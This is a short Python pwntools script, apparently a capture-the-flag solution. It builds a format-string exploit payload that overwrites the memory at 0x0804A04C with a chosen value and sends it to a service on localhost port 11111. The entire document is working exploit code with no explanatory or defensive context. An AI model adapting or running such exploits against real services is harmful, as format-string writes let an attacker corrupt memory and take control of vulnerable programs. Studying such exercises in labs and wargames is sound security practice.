#!/usr/bin/python
from pwn import *
# *0804A04C = 0xCCC31337

writes = {0x0804A04C:0xCCC31337+0x7070707}

payload = fmtstr_payload(7,writes,numbwritten = 7)
r = remote("localhost",11111)
r.write(payload+'\n')
print r.recvall()
r.close()
